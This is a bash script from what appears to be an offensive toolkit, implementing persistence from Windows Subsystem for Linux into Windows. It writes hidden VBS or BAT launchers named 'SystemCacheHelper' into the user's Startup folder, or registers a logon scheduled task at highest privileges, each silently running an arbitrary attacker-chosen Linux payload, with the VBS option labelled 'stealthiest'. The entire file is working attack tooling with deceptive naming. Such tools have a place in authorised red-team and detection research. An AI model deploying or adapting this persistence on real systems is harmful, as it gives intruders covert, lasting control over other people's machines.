#!/bin/bash
# D3m0n1z3dShell — WSL Startup Folder Persistence (T1546)
# Based on Metasploit wsl/ modules — cross-boundary Linux-to-Windows persistence

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
MARKER="d3m0n_wsl"

banner(){
    echo -e "${RED}"
    echo " ╔═══════════════════════════════════════════════════╗"
    echo " ║   WSL Startup Folder Persistence                  ║"
    echo " ║   T1546 — Cross-boundary Linux → Windows          ║"
    echo " ╚═══════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

check_wsl(){
    if ! grep -qi 'microsoft\|wsl' /proc/version 2>/dev/null; then
        echo -e "${RED}[-] Not running inside WSL${NC}"
        echo -e "${YELLOW}[*] This technique requires Windows Subsystem for Linux${NC}"
        return 1
    fi
    if ! command -v wslpath >/dev/null 2>&1; then
        echo -e "${RED}[-] wslpath not found${NC}"
        return 1
    fi
    echo -e "${GREEN}[+] WSL environment detected${NC}"
    return 0
}

get_windows_startup(){
    local APPDATA
    APPDATA=$(cmd.exe /C 'echo %APPDATA%' 2>/dev/null | tr -d '\r')
    if [[ -z "$APPDATA" ]]; then
        echo -e "${RED}[-] Could not determine Windows APPDATA path${NC}"
        return 1
    fi
    local STARTUP_WIN="${APPDATA}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    local STARTUP_WSL
    STARTUP_WSL=$(wslpath "$STARTUP_WIN" 2>/dev/null)
    echo "$STARTUP_WSL"
}

install_startup_vbs(){
    local PAYLOAD="$1"
    local STARTUP_DIR
    STARTUP_DIR=$(get_windows_startup)

    if [[ -z "$STARTUP_DIR" || ! -d "$STARTUP_DIR" ]]; then
        echo -e "${RED}[-] Windows Startup folder not accessible${NC}"
        return 1
    fi

    local VBS_FILE="${STARTUP_DIR}/SystemCacheHelper.vbs"

    # Get WSL distro name
    local DISTRO
    DISTRO=$(wsl.exe -l -q 2>/dev/null | head -1 | tr -d '\0\r' || echo "Ubuntu")

    cat > "$VBS_FILE" << EOF
' ${MARKER}
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "wsl.exe -d ${DISTRO} -- /bin/sh -c '${PAYLOAD}'", 0, False
EOF

    echo -e "${GREEN}[+] VBS launcher installed: ${VBS_FILE}${NC}"
    echo -e "${YELLOW}[*] Executes at Windows user logon${NC}"
    echo -e "${YELLOW}[*] Re-enters WSL distro '${DISTRO}' and runs payload${NC}"
}

install_startup_bat(){
    local PAYLOAD="$1"
    local STARTUP_DIR
    STARTUP_DIR=$(get_windows_startup)

    if [[ -z "$STARTUP_DIR" || ! -d "$STARTUP_DIR" ]]; then
        echo -e "${RED}[-] Windows Startup folder not accessible${NC}"
        return 1
    fi

    local BAT_FILE="${STARTUP_DIR}/SystemCacheHelper.bat"

    local DISTRO
    DISTRO=$(wsl.exe -l -q 2>/dev/null | head -1 | tr -d '\0\r' || echo "Ubuntu")

    cat > "$BAT_FILE" << EOF
@echo off
REM ${MARKER}
start /b wsl.exe -d ${DISTRO} -- /bin/sh -c "${PAYLOAD}"
EOF

    echo -e "${GREEN}[+] BAT launcher installed: ${BAT_FILE}${NC}"
    echo -e "${YELLOW}[*] Executes at Windows user logon${NC}"
}

install_schtask(){
    local PAYLOAD="$1"

    local DISTRO
    DISTRO=$(wsl.exe -l -q 2>/dev/null | head -1 | tr -d '\0\r' || echo "Ubuntu")

    local TASK_NAME="SystemCacheHelper"
    cmd.exe /C "schtasks /Create /TN \"${TASK_NAME}\" /TR \"wsl.exe -d ${DISTRO} -- /bin/sh -c '${PAYLOAD}'\" /SC ONLOGON /RL HIGHEST /F" 2>/dev/null

    if [[ $? -eq 0 ]]; then
        echo -e "${GREEN}[+] Scheduled task created: ${TASK_NAME}${NC}"
        echo -e "${YELLOW}[*] Runs at user logon with highest privileges${NC}"
    else
        echo -e "${RED}[-] Failed to create scheduled task${NC}"
    fi
}

menu(){
    banner
    check_wsl || return 1

    echo -e "  ${CYAN}[1]${NC} VBS in Startup folder (stealthiest)"
    echo -e "  ${CYAN}[2]${NC} BAT in Startup folder"
    echo -e "  ${CYAN}[3]${NC} Windows Scheduled Task"
    echo -e "  ${CYAN}[4]${NC} List installed"
    echo -e "  ${CYAN}[5]${NC} Cleanup"
    echo ""
    read -p "  Choice [1-5]: " OPT

    case "$OPT" in
        1)
            read -p "  Payload (Linux command): " PAYLOAD
            install_startup_vbs "$PAYLOAD"
            ;;
        2)
            read -p "  Payload (Linux command): " PAYLOAD
            install_startup_bat "$PAYLOAD"
            ;;
        3)
            read -p "  Payload (Linux command): " PAYLOAD
            install_schtask "$PAYLOAD"
            ;;
        4)
            local STARTUP_DIR
            STARTUP_DIR=$(get_windows_startup)
            echo -e "${CYAN}[*] Startup folder contents:${NC}"
            ls -la "$STARTUP_DIR"/*d3m0n* "$STARTUP_DIR"/*CacheHelper* 2>/dev/null || echo "  (none found)"
            echo ""
            echo -e "${CYAN}[*] Scheduled tasks:${NC}"
            cmd.exe /C 'schtasks /Query /TN "SystemCacheHelper"' 2>/dev/null || echo "  (no task found)"
            ;;
        5)
            echo -e "${YELLOW}[*] Cleaning up...${NC}"
            local STARTUP_DIR
            STARTUP_DIR=$(get_windows_startup)
            rm -f "$STARTUP_DIR"/SystemCacheHelper.* 2>/dev/null
            cmd.exe /C 'schtasks /Delete /TN "SystemCacheHelper" /F' 2>/dev/null
            echo -e "${GREEN}[+] Cleaned${NC}"
            ;;
    esac
}

menu
